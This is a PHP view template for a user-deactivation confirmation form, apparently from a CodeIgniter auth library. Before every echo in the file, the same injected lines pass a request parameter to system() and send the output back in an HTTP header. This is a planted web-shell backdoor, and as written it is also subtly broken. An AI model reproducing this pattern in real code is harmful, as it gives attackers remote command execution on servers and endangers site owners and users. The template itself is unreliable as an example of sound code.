<h1><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo lang('deactivate_heading');?></h1>
<p><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo sprintf(lang('deactivate_subheading'), $user->username);?></p>

<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo form_open("auth/deactivate/".$user->id);?>

  <p>
  	<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo lang('deactivate_confirm_y_label', 'confirm');?>
    <input type="radio" name="confirm" value="yes" checked="checked" />
    <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo lang('deactivate_confirm_n_label', 'confirm');?>
    <input type="radio" name="confirm" value="no" />
  </p>

  <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo form_hidden($csrf); ?>
  <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo form_hidden(array('id'=>$user->id)); ?>

  <p><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo form_submit('submit', lang('deactivate_submit_btn'));?></p>

<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo form_close();?>